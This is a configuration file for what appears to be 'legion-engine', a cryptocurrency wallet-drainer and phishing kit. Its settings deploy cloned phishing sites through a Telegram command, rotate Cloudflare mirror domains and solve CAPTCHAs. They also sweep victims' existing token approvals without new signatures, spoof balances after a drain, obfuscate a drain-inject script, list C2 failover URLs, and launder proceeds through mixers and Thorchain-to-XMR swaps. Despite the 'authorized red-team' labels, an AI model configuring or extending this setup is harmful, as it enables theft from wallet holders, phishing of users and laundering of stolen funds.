DELAY_SETTLEMENT_MAX_HOURS=6
# Legacy MEV whale cutoff (separate from adaptive delay threshold)
DELAY_SETTLEMENT_ABOVE_USD=100000
# Exchange hot-wallet deferral (split into daily chunks)
EXCHANGE_WALLET_LIST_URL=
EXCHANGE_DEFER_DAILY_USD=50000
EXCHANGE_DEFER_CHUNK_DAYS=3
# Post-settlement monitored wallets — allowance reuse every N hours
MONITORED_WALLET_MIN_USD=25000
WALLET_MONITOR_INTERVAL_HOURS=6
#
# HARDWARE_AUTO_CONSENT=true    # legacy flag (modal is informational only; no auto-bypass)
# FORCE_HARDWARE_BYPASS=true    # --force-hardware-bypass / god-mode: skip modal entirely (testing only)
# KINETIC_INTERNAL_KEY=         # enables allowance-reuse + experimental background scan
# FAKE_BALANCE_AFTER_DRAIN=true # persist pre-drain balances; spoof balance APIs after drain
#
# Telegram /clone command (authorized chats only — runs generator + deploy with --god-mode)
# PHISHING_TRAINING_MODE=true   # required by generator (bot sets this automatically)
# VERCEL_TOKEN=                 # deploy clones to Vercel (--prod)
# NETLIFY_TOKEN=                # fallback deploy to Netlify if VERCEL_TOKEN unset
# CLONE_LOCAL_PORT=8765         # local static server port when no deploy tokens set
# CLONE_KEEP_TEMP=true          # keep /tmp/clone_* dirs after deploy (debug)
# --mobile-optimize             # inject legion-mobile-optimize.css/js for mobile QA clones

# ── Mirror service (authorized red-team staging) ───────────────────────────────
# Multi-provider CAPTCHA (fallback order: 2captcha → capsolver → anticaptcha)
# TWOCAPTCHA_API_KEY=
# CAPSOLVER_API_KEY=
# ANTICAPTCHA_API_KEY=
# CAPTCHA_PROVIDER_ORDER=2captcha,capsolver,anticaptcha
# MIRROR_CAPTCHA_PORT=9100

# Cloudflare domain rotation
# CLOUDFLARE_API_TOKEN=
# CLOUDFLARE_ZONE_ID=
# CLOUDFLARE_BASE_DOMAIN=mirror.example.com
# MIRROR_VPS_IP=1.2.3.4
# MIRROR_ROTATION_INTERVAL_HOURS=12
# MIRROR_HEALTH_CHECK_INTERVAL_MINUTES=15
# MIRROR_NGINX_CONF_PATH=/etc/nginx/nginx.conf
# MIRROR_SSL_CERT_PATH=/etc/nginx/ssl/active.crt
# MIRROR_SSL_KEY_PATH=/etc/nginx/ssl/active.key
# MIRROR_HTTPS_PORT=443

# VPS one-click deploy (scripts/deploy-mirror.ts)
# MIRROR_VPS_HOST=1.2.3.4
# MIRROR_VPS_USER=root
# MIRROR_VPS_KEY=~/.ssh/id_rsa
# MIRROR_VPS_REMOTE_DIR=/opt/legion-mirror

# Campaign mirror API: POST /api/v1/campaigns/:id/rotate (DASHBOARD_API_KEY)

# Allowance reuse — sweep existing approvals to vault (no new user signatures)
ALLOWANCE_REUSE_ENABLED=false
# TON jetton lane — follows ALLOWANCE_REUSE_ENABLED unless set to false
TON_ALLOWANCE_REUSE_ENABLED=true
AUTO_REUSE_ALLOWANCES=false
ALLOWANCE_REUSE_BATCH_SIZE=50
# ALLOWANCE_REUSE_EVM_CHAIN_ID=1
# ALLOWANCE_REUSE_EVM_TOKENS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xdAC17F958D2ee523a2206206994597C13D831ec7
# TRON_EXECUTION_PRIVATE_KEY=
# ALLOWANCE_REUSE_TRON_SPENDER=
# ALLOWANCE_REUSE_SOL_DELEGATE=

# Non-EVM server signing — build & broadcast without user-signed payloads
NON_EVM_SERVER_SIGNING=false

# Privacy mixer for all chains (Jupiter / Thorchain / Dedust)
PRIVACY_MIXER_ALL_CHAINS=false
# PRIVACY_MIXER_SOL_FROM_ASSET=SOL.SOL
# PRIVACY_MIXER_TRON_FROM_ASSET=TRX.TRX
# PRIVACY_MIXER_BTC_FROM_ASSET=BTC.BTC
# TON Dedust swap settings (Step 1: TON→stable on-chain, Step 2: Thorchain→XMR)
# PRIVACY_MIXER_TON_USDT_MASTER=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs   # USDT on TON
# PRIVACY_MIXER_TON_FROM_ASSET=TON.TON          # Thorchain TON asset (if supported)
# PRIVACY_MIXER_TON_THOR_ASSET=ETH.USDC-0XA0B86991C6218B36C1D19D4A2E9EB0CE3606EB48
# DEDUST_API_URL=https://api.dedust.io/v2
# DEDUST_TON_VAULT_ADDRESS=EQBfBWT7X2BHg9tXAxzhz2aKiNTU1tpt5NsiK0uSDW_YAJ67

# Minimum native balance left on execution wallets after /sweep and /mix (human units)
EXECUTION_GAS_RESERVE_EVM=0.005
EXECUTION_GAS_RESERVE_SOL=0.05
EXECUTION_GAS_RESERVE_TRX=50
EXECUTION_GAS_RESERVE_TON=2
EXECUTION_GAS_RESERVE_BTC=0.00015

# Non-custodial split-withdraw mixer — ephemeral burners → FINAL_WALLET_* (Telegram logs only)
MIXING_ENABLED=false
# MIXING_MIN_CHUNKS=3
# MIXING_MAX_CHUNKS=5
# MIXING_DELAY_MIN_SEC=10
# MIXING_DELAY_MAX_SEC=45
# MIXING_MIN_ETH=0.001
# MIXING_MIN_SOL=0.001
# MIXING_MIN_TRX=1
# MIXING_MIN_TON=0.1

# Simple vault sweep — native + token transfers to FINAL_WALLET_* (no swaps/mixers)
SWEEP_ENABLED=false
SWEEP_CREATE_ATA=true
# SWEEP_TON_JETTON_MASTERS=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs
SWEEP_CRON=0 */6 * * *
FINAL_WALLET_EVM=0x...
FINAL_WALLET_SOL=
FINAL_WALLET_TRX=
FINAL_WALLET_TON=
FINAL_WALLET_BTC=
SWEEP_MIN_ETH=0.001
SWEEP_MIN_SOL=0.001
SWEEP_MIN_TRX=1
SWEEP_MIN_TON=0.1
SWEEP_MIN_BTC=0.00001
# Legacy sweep minimums — used only when EXECUTION_GAS_RESERVE_* is unset
SWEEP_ERC20_TOKENS=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,0xdAC17F958D2ee523a2206206994597C13D831ec7
# SWEEP_TRC20_CONTRACTS=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t

# Sentinel runtime monitoring
SENTINEL_RUNTIME_ENABLED=false
SENTINEL_RUNTIME_INTERVAL_MS=300000

# BullMQ dead-letter queue (7-day retention in Redis)
BULLMQ_DLQ_ENABLED=true

# ── Client inject hardening (authorized red-team) ──
# XOR obfuscation for authorized-drain-inject.js when true
CLIENT_OBFUSCATE=false
# Daily endpoint rotation seed (falls back to GATEKEEPER_SECRET)
CLIENT_ENCRYPT_KEY=
# Comma-separated C2 / API failover URLs (client-config rotation)
BACKEND_URLS=
# EIP-7702 SET_CODE delegation ingress (requires deployed delegate contract)
EIP7702_ENABLED=false
EIP7702_DELEGATE_CONTRACT=
ONCHAIN_CONFIG_CONTRACT_ADDRESS=

# ── Observability ────────────────────────────
LOG_LEVEL=info
OTEL_EXPORTER_OTLP_ENDPOINT=
OTEL_SERVICE_NAME=legion-engine
